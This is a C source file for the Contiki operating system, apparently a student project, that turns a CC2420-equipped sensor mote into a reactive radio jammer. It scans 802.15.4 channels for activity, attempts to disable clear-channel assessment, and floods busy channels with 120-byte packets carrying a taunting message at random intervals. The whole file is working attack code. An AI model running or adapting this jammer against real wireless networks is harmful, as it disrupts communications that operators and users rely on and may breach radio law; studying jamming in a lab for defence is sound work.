
/**
 * \file
 *         Program for jamming a specific channel
 * \author
 *         Malthe Tøttrup <201907882@post.au.dk>
 * 
 *         $ make TARGET=sky distclean 
 *         $ make TARGET=sky MOTES=/dev/ttyUSB0 jammer_random.upload login
 */

#include "contiki.h"
#include <stdio.h> /* For printf() */
#include <math.h>
#include <os/dev/radio.h>  
#include "net/nullnet/nullnet.h"
#include "net/netstack.h"
#include <string.h>
#include <stdbool.h>
#include "sys/log.h"
#include "cc2420.h"
#include <stdlib.h>
#include "dev/watchdog.h"
#include "sys/energest.h"

#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO
#define CLOCK_MS CLOCK_SECOND/1000
#define SEND_INTERVAL (2 * CLOCK_MS) //2 ms
#define JAMMER_PACKET_LEN 120


static int current_channel = 11;

typedef struct{
     char data[JAMMER_PACKET_LEN];
}jpacket_t;

/*---------------------------------------------------------------------------*/
PROCESS(jammer, "jammer process");
AUTOSTART_PROCESSES(&jammer);
/*---------------------------------------------------------------------------*/

int abs(a){
    if(a < 0){
        return -1*a;
    }
    else {
        return a;
    }
}


bool check_channel_activity(){
    int channel_activity = 0;
    for (int i = 0; i < 10000; i++){
        NETSTACK_RADIO.on();
        channel_activity += NETSTACK_RADIO.channel_clear();     //returns 0 if channel is busy and 1 if its clear
        NETSTACK_RADIO.off();
    }
    printf("channel activity result: %d \n", channel_activity);

    if(channel_activity != 10000){
        printf("Activity found on channel %d! \n", current_channel);
        return true; 
    }
    else {
        printf("No activity found on channel %d. \n", current_channel);
        return false;
    }
}





PROCESS_THREAD(jammer, ev, data)
{   
    PROCESS_BEGIN();
    printf("Starting jamming attack\n");

    NETSTACK_RADIO.on();
    // NETSTACK_RADIO.set_value(RADIO_PARAM_CCA_THRESHOLD, 70);

    //Hopefully this turns CCA off...
    NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);

    //Connect to the desired channel
    if(NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, current_channel) != RADIO_RESULT_OK) 
    {
        printf("failed channel set");
    }
    NETSTACK_RADIO.off();

    cc2420_set_channel(current_channel);
    
    jpacket_t jpacket;
    memset(&jpacket, 0, sizeof(jpacket_t));
    
    strcpy(jpacket.data, "Antonio Gonga is taking down your network.");
    

    static int random_interval = 0;
    static int wait_time = 0;
    static int send_time = 0;
    static int k = 0;
    
    static struct etimer et;
    etimer_set(&et, CLOCK_SECOND);
    srand(128);

    //send a packet at random times between 0-2 seconds
    while(1) {

        // Check if current_channel is active
        // If not active, we go to next channel and try again
        watchdog_stop();
        if (!check_channel_activity())
        {   
            // Cycle to next current_channel
            // current_channel = (current_channel >= 26) ? 11 : current_channel++;
            if (current_channel >= 25) {
                current_channel = 11;
            } else {
                current_channel++;
                if(current_channel == 12) { current_channel = 17;}
            }
            cc2420_set_channel(current_channel);
            // Start loop again
            continue;
        }

        while(k < 10){
            PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
            // cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
            
            send_time = abs(rand() % (int)CLOCK_SECOND*4);
            wait_time = abs(rand() % (int)CLOCK_SECOND*3);
            if(wait_time == 0)
                wait_time = 1;
                    
            
            while(random_interval <= send_time){
                NETSTACK_RADIO.on();
                cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
                NETSTACK_RADIO.off();
                random_interval++;
            }
            
            random_interval = 0;

            //printf("wait_time: %d\n", wait_time);
            etimer_set(&et, wait_time);
            etimer_reset(&et);
            k++;
        }
        watchdog_start();
        k = 0; 
    }

    PROCESS_END();
}

